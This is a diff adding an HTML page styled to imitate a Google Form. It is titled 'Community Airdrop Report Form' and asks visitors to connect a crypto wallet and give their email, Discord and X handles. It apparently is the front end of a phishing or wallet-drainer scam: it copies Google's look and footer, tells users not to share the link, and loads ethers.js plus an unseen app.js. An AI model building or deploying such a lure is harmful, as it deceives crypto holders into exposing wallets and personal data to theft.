@@ -1,1 +1,151 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>Community Airdrop Report Form</title>
+
+<style>
+* { margin:0; padding:0; box-sizing:border-box; font-family: Roboto, RobotoDraft, Helvetica, Arial, sans-serif; }
+body { background:#f0edf7; padding:20px; display:flex; justify-content:center; min-height:100vh; }
+.container { width:100%; max-width:820px; }
+.form-header { background:white; border-radius:10px; overflow:hidden; margin-bottom:15px; box-shadow:0 1px 3px rgba(0,0,0,0.1); }
+.top-bar { height:10px; background:#673ab7; }
+.header-content { padding:28px; }
+.header-content h1 { font-size:2rem; color:#202124; margin-bottom:10px; }
+.header-content p { color:#5f6368; line-height:1.5; }
+.required-note { margin-top:20px; color:#d93025; font-size:14px; }
+.form-card { background:white; border-radius:10px; padding:30px; margin-bottom:15px; box-shadow:0 1px 3px rgba(0,0,0,0.1); }
+.form-card label { display:block; font-size:16px; margin-bottom:10px; color:#202124; }
+.required { color:#d93025; }
+input[type="text"], input[type="email"], textarea {
+    width:100%; border:none; border-bottom:2px solid #dadce0; outline:none;
+    padding:12px 0; font-size:16px; transition:border-color 0.3s ease; background:transparent;
+}
+input:focus, textarea:focus { border-bottom:2px solid #673ab7; }
+textarea { resize:vertical; min-height:80px; }
+
+/* Wallet Button */
+.wallet-btn {
+    background:white; color:#131313; border:2px solid #121212; border-radius:6px;
+    padding:12px 28px; cursor:pointer; font-size:16px; font-weight:600;
+    transition:all 0.3s ease; letter-spacing:0.3px;
+}
+.wallet-btn:hover { background:#2e2e2e; color:white; }
+.wallet-btn.connected { background:#1a73e8 !important; color:white !important; border-color:#1a73e8 !important; }
+.wallet-btn:disabled { opacity:0.7; cursor:not-allowed; }
+
+.wallet-address {
+    margin-top:15px; color:#202124; font-size:15px; word-break:break-word;
+    padding:12px 16px; background:#f8f9fa; border-radius:6px; border-left:4px solid #34a853;
+    display:none;
+}
+.wallet-address.visible { display:block; }
+
+.status {
+    margin-top:12px; font-size:14px; color:#5f6368; padding:8px 0;
+    min-height:24px; transition:color 0.3s ease;
+}
+.status.success { color:#34a853; font-weight:500; }
+.status.error { color:#d93025; }
+
+/* Submit Area */
+.submit-area {
+    display:flex; justify-content:space-between; align-items:center;
+    background:white; border-radius:10px; padding:20px 30px;
+    box-shadow:0 1px 3px rgba(0,0,0,0.1);
+}
+.submit-btn {
+    background:#b1b1b1; color:rgb(68, 68, 68); border:none; padding:12px 30px;
+    border-radius:5px; font-size:16px; font-weight:500; cursor:pointer;
+    transition:background 0.3s ease;
+}
+.submit-btn:hover { background:#5d5d5d; }
+.submit-btn:disabled { background:#a7a7a7; color:#666; cursor:not-allowed; }
+.clear-btn {
+    color:#673ab7; text-decoration:none; font-weight:500; font-size:14px;
+    padding:8px 16px; border-radius:4px; transition:background 0.2s ease;
+}
+.clear-btn:hover { background:#f3e8ff; }
+.footer {
+    text-align:center; color:#5f6368; margin-top:30px; font-size:14px; line-height:1.8;
+    padding:20px;
+}
+
+@media (max-width:600px) {
+    body { padding:12px; }
+    .header-content h1 { font-size:1.5rem; }
+    .form-card { padding:20px; }
+    .submit-area { flex-direction:column; gap:16px; }
+    .wallet-btn { width:100%; }
+}
+</style>
+</head>
+
+<body>
+
+<div class="container">
+    <div class="form-header">
+        <div class="top-bar"></div>
+        <div class="header-content">
+            <h1>Community Airdrop Report Form</h1>
+            <p>Form is exclusive to inner community members only. Do not share this link with anyone.</p>
+            <div class="required-note">* Indicates required question</div>
+        </div>
+    </div>
+
+    <form id="airdropForm">
+        <!-- Wallet Connection -->
+        <div class="form-card">
+            <label>Connect Wallet <span class="required">*</span></label>
+            <p style="color:#5f6368; font-size:14px; margin-bottom:12px;">
+                Connect your wallet to verify your eligibility for the airdrop claim.
+            </p>
+            <button type="button" id="connectWalletBtn" class="wallet-btn">Connect Wallet</button>
+            <div id="walletAddress" class="wallet-address"></div>
+            <div id="status" class="status"></div>
+        </div>
+
+        <!-- Email -->
+        <div class="form-card">
+            <label>Email <span class="required">*</span></label>
+            <input type="email" id="email" placeholder="Your email" required autocomplete="email">
+        </div>
+
+        <!-- Discord -->
+        <div class="form-card">
+            <label>Discord Username <span class="required">*</span></label>
+            <input type="text" id="discord" placeholder="Your answer" required>
+        </div>
+
+        <!-- X (Twitter) -->
+        <div class="form-card">
+            <label>X (Twitter) Handle <span class="required">*</span></label>
+            <input type="text" id="twitter" placeholder="@username" required>
+        </div>
+
+        <!-- Complaint -->
+        <div class="form-card">
+            <label>Complaint / Description <span class="required">*</span></label>
+            <textarea id="complaint" rows="5" placeholder="Your answer" required></textarea>
+        </div>
+
+        <div class="submit-area">
+            <button type="submit" class="submit-btn">Submit</button>
+            <a href="#" class="clear-btn">Clear form</a>
+        </div>
+    </form>
+
+    <div class="footer">
+        <p>Never submit passwords through this form.</p>
+        <p>This content is neither created nor endorsed by Google.</p>
+        <p style="margin-top:8px; font-size:12px; color:#9aa0a6;">Report abuse</p>
+    </div>
+</div>
+
+<script src="https://cdn.ethers.io/lib/ethers-6.13.0.umd.min.js"></script>
+<script src="app.js"></script>
+
+</body>
+</html>
 
